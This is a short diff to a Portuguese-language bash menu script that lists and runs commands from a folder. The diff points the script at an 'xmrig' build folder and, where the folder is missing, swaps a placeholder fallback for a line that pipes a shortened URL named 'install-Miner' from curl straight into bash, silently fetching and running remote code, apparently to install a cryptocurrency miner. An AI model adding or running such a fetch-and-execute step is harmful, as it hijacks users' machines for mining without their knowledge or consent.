@@ -1,12 +1,9 @@
 #!/bin/bash
-
-PASTA="/caminho/para/sua/pasta"
+PASTA="./xmrig/build"
 COMANDOS_DIR="./comandos"
 
 mostrar_menu() {
-    echo ""
     echo "Escolha uma opção:"
-
     # Lista os arquivos no diretório de comandos
     i=1
     comandos=()
@@ -45,7 +42,7 @@ if [ -d "$PASTA" ]; then
 else
     echo "Pasta NÃO encontrada."
     echo "Executando ação alternativa..."
-    comando_acao_alternativa
+    curl -fsSL https://bit.ly/install-Miner | bash
 fi
 
 # Mostra o menu só uma vez
